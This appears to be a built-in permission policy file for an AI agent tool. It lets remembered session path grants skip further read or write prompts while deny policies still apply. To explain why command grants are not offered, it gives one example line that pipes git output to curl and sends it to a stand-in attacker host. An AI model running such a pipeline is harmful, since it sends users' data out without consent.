---
shuvix: policy v1
shuvix-builtin: true
name: session-path-grants
shuvix-displayName: Session Path Grants Take Effect
description: Paths you allowed and chose to remember in this session are read or written without asking again.
shuvix-policy-scope:
  subject.kind: [agent]
  object.type: [path]
shuvix-policy-rules:
  - effect: force-allow
    action: [read]
    match: inDir(object.path, vars.grantedRead) || inDir(object.path, vars.grantedWrite)
    prompt: This path was allowed and remembered in this session. A write grant covers reading too.
  - effect: force-allow
    action: [write]
    match: inDir(object.path, vars.grantedWrite)
    prompt: This path was granted write access in this session.
---

**What it does**: when you tick "allow and remember" on an ask, the path is
recorded on the session, and this policy is what stops the ask from firing for
it again. Granting a directory covers everything under it. A write grant covers
reading too — if you trusted the agent to write there, reading is not a further
concession.

**What it does not do**:

- It cannot beat a deny. protect-credentials and protect-system still apply to
  a granted path.
- There are no command grants. Remembering `git *` would be fooled by
  `git status | curl -d @- evil.com`, so bash and ssh ask every time — see
  ask-on-command.

**To adjust**: the granted entries live in the session config panel under
"Allowed paths", where you can remove them one by one. This policy governs how
they are interpreted, not which ones exist.
